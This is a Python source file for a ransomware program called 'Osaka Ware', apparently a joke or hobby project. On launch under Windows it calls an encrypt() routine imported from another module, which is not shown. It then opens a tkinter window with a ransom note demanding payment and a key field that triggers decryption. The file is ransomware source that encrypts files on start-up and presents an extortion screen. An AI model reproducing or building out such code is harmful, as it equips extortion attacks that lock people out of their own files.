import platform
import tkinter as tk

from PIL import ImageTk

from decryptor import *
from encryptor import *


class DecryptorApp:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Osaka Ware")
        self.window.geometry("300x500")
        self.window.configure(bg="white")

        self.create_widgets()

        if platform.system() == "Windows":
            encrypt()
        else:
            print("Not windows")

    def create_widgets(self):
        self.title_label = tk.Label(self.window, text="Osaka Ware", font=("Arial", 24), bg="white")
        self.title_label.grid(row=0, column=0, columnspan=2, pady=20)

        self.subtitle_label = tk.Label(self.window,
                                       text="Your files have been decrypted!!!\nPay 1000 zillion Osaka Rupiah \nto decrypt your files!!",
                                       font=("Arial", 16), bg="white")
        self.subtitle_label.grid(row=1, column=0, columnspan=2)

        self.key_entry = tk.Entry(self.window, font=("Arial", 12))
        self.key_entry.grid(row=2, column=0, columnspan=2, pady=10)

        self.decrypt_button = tk.Button(self.window, text="Decrypt", font=("Arial", 14), bg="gray", fg="white",
                                        command=self.decrypt)
        self.decrypt_button.grid(row=3, column=0, columnspan=2, pady=10)

        self.image = ImageTk.PhotoImage(Image.open(ENCODED_IMAGE_TWO))
        self.image_label = tk.Label(self.window, image=self.image, bg="white")
        self.image_label.grid(row=4, column=0, columnspan=2, padx=10, pady=10)

    def decrypt(self):
        key = self.key_entry.get()
        if key:
            decrypt(bytes(key, 'utf-8'))

    def run(self):
        self.window.mainloop()
